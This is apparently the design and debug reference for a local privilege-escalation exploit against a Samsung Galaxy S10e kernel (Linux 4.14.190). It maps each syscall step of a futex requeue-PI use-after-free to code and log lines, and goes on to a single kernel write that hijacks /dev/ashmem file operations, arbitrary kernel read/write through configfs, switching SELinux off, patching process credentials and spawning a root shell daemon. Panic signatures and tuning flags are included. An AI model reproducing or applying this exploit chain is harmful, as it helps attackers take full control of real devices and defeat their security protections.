# FLOW.md — syscall-level exploit flow (debug reference)

GhostLock **deep fork** for **Samsung SM-G970W (beyond0q, SD855, Linux 4.14.190)**.
This document is the low-level trace of "how we try to get root", one syscall at a
time, mapped to code and to the exact log line each step emits. It exists so that
after a crash/reset you can read the **last log line** and know *which step* broke.

- Source refs are `src/...` (this repo).
- Log strings are the `pr_*` lines in the code.
- Syscall numbers are given only where the code hardcodes them
  (`sched_setattr`=274 / ARM EABI 380; `select`=142 on the 32-bit route).
  Otherwise the libc/syscall **name** is used.

---

## 0. Actors

| Actor | What it is |
|---|---|
| `main` thread | orchestrates; runs the route threads; calls `try_cfi_stage` |
| `owner` thread | holds futex `f_pi_target`, then blocks on `f_pi_chain` |
| `waiter` (T) thread | holds `f_pi_chain`, blocks in `FUTEX_WAIT_REQUEUE_PI`; later paints the dangling waiter |
| `consumer` thread | fires `sched_setattr(T)` → the PI walk (the one write) |
| UMH child | kernel-spawned process; **uid 0**; runs the root script / daemon |
| root child | forked `ll_root_child`; cred-patched; spawns the root shell daemon |

One process (`glXX`, uid 2000/shell) contains the 4 threads.

---

## 1. Phase 0 — bootstrap (`main.c:run_exploit` 679)

| Step | Actor | Syscall | Args / purpose | Code | Log |
|---|---|---|---|---|---|
| 0.1 | main | `uname` | match `4.14.190-…G970W…` → `active_offsets` | `main.c:85` | `kernel: …` / `offsets matched: …` |
| 0.2 | main | `open`,`read`,`close` | `/proc/self/attr/current`, `/sys/fs/selinux/enforce`, `/proc/self/status` | `util.c:116-144` | `startup context …` |
| 0.3 | main | `open`,`read`,`close` | `/proc/sys/kernel/random/boot_id` | `util.c:224` | — |
| 0.4 | main | `open`,`stat`,`opendir`/`readdir`/`closedir` | find `/dev/ashmem<bootid>` (else scan `/dev/ashmem*` by `st_rdev`) | `util.c:232-263` | — |
| 0.5 | main | `setrlimit`, `sched_setaffinity` | raise limits; pin core 0 | `set_limit`,`pin_to_core` | — |
| 0.6 | main | `open(O_WRONLY\|O_CREAT\|O_TRUNC,0755)`,`write`,`close` | write `/data/local/tmp/.ghostlock_root.sh` (+ `.ghostlock_fixpol.sh`) **as uid 2000** | `main.c:474` | — |
| 0.7 | main | *(env)* `SLIDE=0x…` | set `kaslr_base/slide`; **skips** `slide_leak_kernel_base()` | `main.c:705-718` | `slide SLIDE env base=… slide=…` |

> If `SLIDE` is absent, step 0.7b runs the pselect-based KASLR leak (separate PI-write
> gadget; not covered here). All our runs pass `SLIDE`.

---

## 2. Phase 1 — build the fake page + leak its direct-map address

| Step | Actor | Syscall | Args / purpose | Code | Log |
|---|---|---|---|---|---|
| 1.1 | main | `memfd_create("ghostlock",0)` | one page we control | `util.c:1034` | — |
| 1.2 | main | `ftruncate(fd,0x1000)` | size 4 KB | `util.c:1036` | — |
| 1.3 | main | `mmap(NULL,0x1000,RW,MAP_SHARED,fd,0)` | write straight into the page-cache page | `util.c:1041` | — |
| 1.4 | main | *(user)* `memset(map,0x41,0x1000)` | fault the page in | `util.c:1049` | — |
| 1.5 | main | `perf_event_open(SOFTWARE/CPU_CLOCK,period=200,IP|REGS_INTR,exclude_user=1)` | kernel-only sampling | `util.c:967` | — |
| 1.6 | main | `mmap(33 pages,MAP_SHARED,perf_fd,0)` | perf ring | `util.c:970` | — |
| 1.7 | main | `ioctl(perf_fd,PERF_EVENT_IOC_ENABLE)` | — | `util.c:973` | — |
| 1.8 | main | **`pread(perf_page_fd,map,0x1000,0)` ×500000** | self-copy; in `copy_page_to_iter` a register holds `page_address(page)` = **direct-map address of our page** | `util.c:974` | — |
| 1.9 | main | `ioctl(DISABLE)`,`munmap`,`close` | pick top candidate = `base` | `util.c:976-1011` | `perf page leak: top=… count=…` |
| 1.10 | main | *(user)* `memcpy(map, skb_buf+LOCK_OFF, 0x1000)` | install fake image (page offset = `.c` offset + `SKB_DATA_DELTA=-0xE80`) | `util.c:1054` | `prepare_perf_fake_page ok base=… lock=… task=… fops=…` |

Fake page layout (page offsets): `lock@0x000`, `fops table@0x100`, `W0@0x300`,
`fake_task@0x400`, `cred_copy`, `binwrite_target@0x700`.

---

## 3. Phase 2 — the UAF route (produce the single write)

### 3a. Threads + requeue (main/owner/waiter)

| Step | Actor | Syscall | Args / purpose | Code | Log |
|---|---|---|---|---|---|
| 2.1 | main | `socket(AF_INET,SOCK_STREAM,0)`, `pipe(pfd)`, `pthread_create ×3`, `sched_setaffinity` | setup | `fops.c:489,501`, `main.c:305-307` | `ssopt hold pipe r=… w=…` |
| 2.2 | owner | `futex(&f_pi_target,FUTEX_LOCK_PI,0)` | own the target lock | `main.c:174` | `owner: target_lock ret=0` |
| 2.3 | waiter T | `futex(&f_pi_chain,FUTEX_LOCK_PI,0)` | T locks chain first | `main.c:151` | `waiter: chain_lock ret=0` |
| 2.4 | owner | `futex(&f_pi_chain,FUTEX_LOCK_PI,0)` | owner blocks on chain | `main.c:179` | `owner: chain_lock_enter` |
| 2.5 | waiter T | `futex(&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&timeout,&f_pi_target,0)` | T blocks; a `rt_mutex_waiter` is placed **on T's kernel stack** | `main.c:160` | `waiter: wrp_enter` |
| 2.6 | main | **`futex(&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1,&f_pi_target,0)`** | requeue ⇒ leaves the waiter **dangling** on T's stack (the UAF) | `main.c:317` | `main: cmp_requeue ret=-1 errno=35` |
| 2.7 | waiter T | *(return)* `FUTEX_WAIT_REQUEUE_PI` → `-1/ETIMEDOUT(110)` | T leaves wait; stack region persists | `main.c:160` | `waiter: wrp_ret ret=-1 errno=110` |

### 3b. Leak the waiter address (T)

Condition: `SSOPT_EMPTY=1 && !ssopt_leaked_waiter`.

| Step | Actor | Syscall | Args / purpose | Code | Log |
|---|---|---|---|---|---|
| 2.8 | T | `perf_event_open(period=20000,IP|REGS_INTR)` | sample T's own kernel stack | `util.c:766` | — |
| 2.9 | T | `mmap(perf)`, `ioctl(ENABLE)` | — | `util.c:769-775` | — |
| 2.10 | T | `setsockopt(fd,SOL_SOCKET,1000,dummy,0x60) ×400` | paint dummy to trigger samples | `fops.c:528` | — |
| 2.11 | T | `ioctl(DISABLE)`,`munmap`,`close` | `waiter = (SP & ~0x3fff) | 0x3d10` | `util.c:862` | `waiter leak: … lo=0x3d10` / `ssopt waiter = …` |

### 3c. Paint + fire (per attempt; `PSELECT_CFI_ROUTE_ATTEMPTS=8`)

| Step | Actor | Syscall | Args / purpose | Code | Log |
|---|---|---|---|---|---|
| 2.12 | T | **`setsockopt(fd,SOL_SOCKET,1000,buf,0x60)`** | `sock_setsockopt` copies `buf` to its stack buffer at `SP0-0x1c0`; `buf[0x10..]` overlays the dangling waiter. With `SSOPT_EMPTY=1`: `tree_entry.__rb_parent_color = waiter` (RB_EMPTY_NODE), `task=fake_task`, `lock=fake_lock`, `prio=140` | `fops.c:696` | `ssopt pre paint … task=… lock=…` |
| 2.13 | T | `select(64, empty-pipe-read, …)` **if HOLD=1**, else spin at EL0 | keep the paint alive during the walk | `fops.c:711-717` | — |
| 2.14 | consumer | **`syscall(274, tid, &attr, 0)`** (`SCHED_BATCH, nice=19`; ARM EABI `380`) | `__sched_setscheduler → rt_mutex_adjust_pi → rt_mutex_adjust_prio_chain(T)` = **PI walk**; rb-tree op on the painted waiter ⇒ **one write: `*ashmem_misc.fops = fake_fops`** | `main.c:195,223`, `util.c:185-201` | `consumer: walk begin tid=…` → `consumer: walk end ret=0` |
| 2.15 | consumer | fallback `futex(&f_pi_target,FUTEX_LOCK_PI,0,&ft)` + `FUTEX_UNLOCK_PI` | only if 2.14 failed | `main.c:229-232` | — |
| 2.16 | T | *(user)* `ssopt_page_readback()` | read the page back through the mmap | `util.c:1026` | `ssopt peek …` / `ssopt scratch readback …` |
| 2.17 | T | *(user)* | count `calls/success` for the attempt | `fops.c:763-776` | `ssopt done attempt=… calls=… success=…` |

**Write source note:** with `SSOPT_EMPTY=1` steps `[7]` of `rt_mutex_adjust_prio_chain`
(`rt_mutex_dequeue`) is a no-op; the write is expected from `[11]`
(`rt_mutex_dequeue_pi`/`rt_mutex_adjust_prio`, `rtmutex.c:716-747`). See §5 caveat.

---

## 4. Phase 3 — turn `/dev/ashmem` into the configfs R/W gadget

Runs inside `try_cfi_stage()` (`fops.c:905`) when `calls>0 && success>0` (2.17).

| Step | Actor | Syscall | Args / purpose | Code | Log |
|---|---|---|---|---|---|
| 3.1 | main | *(user)* rebuild fake fops table | restore owner/llseek clobbered by the walk | `util.c:901` | `ssopt fops page repair: …` |
| 3.2 | main | `open(ashmem_path,O_RDWR\|O_CLOEXEC)` | `misc_open` installs `ashmem_misc.fops = fake_fops` | `fops.c:910` | `cfi attempt=1 fd=5 path=…` |
| 3.3 | main | `ioctl(fd,ASHMEM_SET_NAME,blob)` ×N, then `pwrite(fd,data,len,0)` | **`configfs_write_once` = write any kernel address** | `util.c:1293` | `cfi write ret=… errno=…` |
| 3.4 | main | `ioctl(fd,ASHMEM_SET_NAME,blob)`, `pread(fd,data,len,pos)` | **`configfs_read_once` = read any kernel address** | `util.c:1312` | `cfi read ret=… errno=…` |
| 3.5 | main | 3.3 + 3.4 | `repair_fake_fops_llseek` | `fops.c:780` | — |
| 3.6 | main | 3.4 on `ashmem_misc.fops` | verify `*fops == fake_fops` | `fops.c:964` | `cfi fops_before ret=8 value=… want=…` |
| 3.7 | main | 3.4, then 3.3 | `restore_slide_boot_id` (fix `random/boot_id`) | `fops.c:872` | `slide restore boot_id …` |
| 3.8 | main | 3.4 ×~5, then 3.3 ×9 | `leak_kernel_base`: read real `ashmem_fops` slots → real slide; rewrite whole fops table with slid `text_addr()` | `fops.c:818` | `kaslr read: alias=…` |

**After 3.8 the process holds arbitrary kernel R/W.** Read bound = `buffer->count`
(`name[0..7]="dev/ashm"`); writes set `bin_buffer_size=len` so the internal
`vfree(bin_buffer)` branch is never taken (`fs/configfs/file.c:335-361`).

---

## 5. Phase 4 — root delivery (`install_child_root`, `fops.c:892`)

`CFG_PHYSRW=1` (default) → `install_configfs_physrw` just sets flags. Then:

### 4a. UMH — run a binary as uid 0 (`umh_root.c:151`)

| Step | Actor | Syscall | Args / purpose | Code | Log |
|---|---|---|---|---|---|
| 4a.1 | main | 3.3 → `selinux_enforcing=0` | disable SELinux | `umh_root.c:170` | `umh: step1 selinux write ok; enforce='0'` |
| 4a.2 | main | 3.4/3.3 | walk `system_unbound_wq → dfl_pwq → pool`; check empty worklist, `nr_idle>0`, pwq refcnt/color | `umh_root.c:180-245` | `umh: step2 wq=…` |
| 4a.3 | main | `posix_openpt/grantpt/unlockpt/ptsname_r/open(slave)/write(master)/write(slave)/close` ×≤8 | wake a `system_unbound_wq` worker (`tty_schedule_flip → queue_work`) | `umh_root.c:120-147` | — |
| 4a.4 | main | 3.3 | write `subprocess_info`(96B)@`page+0x400`/`page+0x480`; bump counters; splice `pool->worklist` | `umh_root.c:296-333` | `umh: queued wq=… work=…` |
| 4a.5 | main | 3.4 poll `completion` | wait for the worker | `umh_root.c:339-347` | `umh: result wake=… complete=… retval=…` |
| 4a.6 | UMH child | `setsid`,`setgid(0)`,`setuid(0)`,`open/write/close` proof, `fork`, `socket/bind/listen/accept/fork/dup2/execl`, `execl("/system/bin/sh", root.sh)` | become root shell + daemon `127.0.0.1:2223` | `umh_root.c:386-428`, `root.c:48-94` | `UMH ROOT uid=0 euid=0 gid=0` (proof file) |

### 4b. cred — patch `cred` (`root.c:376`)

| Step | Actor | Syscall | Args / purpose | Code | Log |
|---|---|---|---|---|---|
| 4b.1 | main | `mmap`,`pipe`,`fork` | `spawn_root_child`; child `prctl(PR_SET_NAME,"ll_root_child")`, `write(ready)`, spin | `root.c:96-187` | `spawn: fork ret=…` |
| 4b.2 | main | 3.4 walk `init_task.tasks` | find child `task_struct` by tgid | `root.c:216` | `root: task cand pid=… tgid=…` / `root self=… comm=… cred=…` |
| 4b.3 | main | 3.3 | `cred`(+`real_cred`): `uid/gid/euid/egid/fsuid/fsgid=0`, `securebits=0`, `caps=CAP_FULL` | `root.c:257-295` | `root cred patched uid=0/0` |
| 4b.4 | child | `setgid(0)`,`setuid(0)`,`fork` → `root_shell_daemon` | root shell on `127.0.0.1:2223` | `root.c:134-161` | `root child result done=… uid_after=0` |

## 6. Phase 5 — cleanup (`fops.c:1027-1057`)

| Step | Actor | Syscall | Purpose |
|---|---|---|---|
| 5.1 | main | 3.3 `*ashmem_misc.fops = original`; `fake_fops.owner=0` | restore fops |
| 5.2 | main | `close(fd)` | close ashmem |

---

## 7. Log → step debug map (read the LAST line after a crash)

| Last log line seen | Step | Meaning |
|---|---|---|
| `exploit start` then nothing | 0.6/0.7 | crashed before the route |
| `main: cmp_requeue ret=-1 errno=35` | 2.6 | normal (EBUSY); looking for `wrp_ret` next |
| `waiter: wrp_ret … errno=110` | 2.7 | normal ETIMEDOUT; route starts |
| `ssopt pre paint …` then **no** `consumer: walk begin` | 2.12–2.13 | paint/hold path stuck |
| `consumer: walk begin` with **no** `consumer: walk end` | **2.14** | **PI walk hung → (silent) watchdog reset** (the #1 blocker) |
| `consumer: walk end …` then no `ssopt done` | 2.16-2.17 | reset after the walk |
| `ssopt done … success=0` | 2.14 | walk returned but did nothing |
| `cfi write ret=-1 errno=22` | 3.3 | redirect did not take (EINVAL) |
| `cfi fops_before ret=8 value=… want=…` (different) | 3.6 | write landed wrong |
| `physrw: configfs-only mode` | 4 preamble | arbitrary R/W is live |
| `umh: result … complete=1 retval=0` | 4a.5 | kernel-side UMH ok; check 4a.6 markers |
| `root cred patched …` | 4b.3 | cred path reached root |

### Panic / reset signatures (from `dumps/kp*.gz`)

| Signature | Step | Cause |
|---|---|---|
| `pc: rb_erase_cached+0x20`, `x0=x25=waiter`, `lr: rt_mutex_adjust_prio_chain+0x310` | 2.14 | paint clobbered; `[7]` rb_erase on garbage children |
| `pc: _raw_spin_trylock+0x1c`, fault VA `0` | 2.14 | `waiter->lock = 0` (paint lost the lock field) |
| `pc: rt_mutex_adjust_prio_chain+0x2ec`, fault VA `0x38` | 2.14 | `fake_lock->waiters.rb_leftmost` wrong ⇒ `BUG_ON(w->lock != lock)` |
| `pc: configfs_read_file → __arch_copy_to_user`, VA `0x78` | 3.4 | configfs read path fault (old build) |
| `pc: try_module_get+0x2c` | 3.2/5 | `fake fops.owner` not nulled ⇒ misc_open module ref |

---

## 8. Env flags (current defaults in code)

| Flag | Default | Effect |
|---|---|---|
| `SLIDE` | — | inject KASLR slide (required; skips slide leak) |
| `ROUTE_SETSOCKOPT` | 0 | use the setsockopt route (our runs: 1) |
| `SSOPT_EMPTY` | 0 | RB_EMPTY_NODE paint → `[7]` no-op, write from `[11]` |
| `SSOPT_FAKE_TASK` | 0 | waiter->task = fake_task (else INIT_TASK) |
| `SSOPT_OWNER0` | **1** | fake_lock->owner = 0 → chain ends at `[9]` (write then from `[7]`) |
| `SSOPT_HOLD` | **1** | block T in `select(64)` during walk (PHIEN notes: destroys paint) |
| `SSOPT_PEEK` | 0 | dump the page right after the walk |
| `PSELECT_ROUTE_DELAY_USEC` | auto | timing between paint and walk |
| `ONLY_FOPS` | 0 | stop after the redirect (safe test) |
| `CFI_STOP_VERIFY` | 0 | stop after redirect verify |
| `SKIP_UMH` / `SKIP_CRED` | 0 | disable a delivery path |
| `CFG_PHYSRW` | 1 | configfs R/W (no pipe slab) |

---

## 9. Known blockers (why root is not demonstrated yet)

1. **PI walk (2.14) is non-deterministic and resets the device.** Two modes: paint
   clobber → `rb_erase_cached` Oops; or hard hang → silent watchdog reset
   (last line = `consumer: walk begin`). Everything downstream depends on this one
   write.
2. **cred path (4b) resets silently** even after a successful redirect (e2e6 14/16).
   Cause unknown; KDP is only a hypothesis.
3. **UMH userland (4a.6) never confirmed** (proof/daemon markers absent); possible
   `/data` fscrypt keyring issue (ENOKEY, unproven).
4. **No persistent root possible** (locked BL, `MODULE_SIG_FORCE=y`, RKP
   KDP/CFP/DMAP_PROT) → runtime-only; `ksud late-load` in the root script cannot work.

### Caveat to verify (design)
Step 2.14 comment block says the write comes from `[11]` (with `SSOPT_EMPTY=1`), but
a second comment (`util.c`) says `SSOPT_OWNER0=1` ends the chain at `[9]` and `[7]`
is the writer. The code default is `SSOPT_OWNER0=1` while the run commands use `0`.
The exact `[7]` vs `[11]` writer, and the exact value written, should be re-derived
(see `docs/AUDIT_PHIEN5.md`).
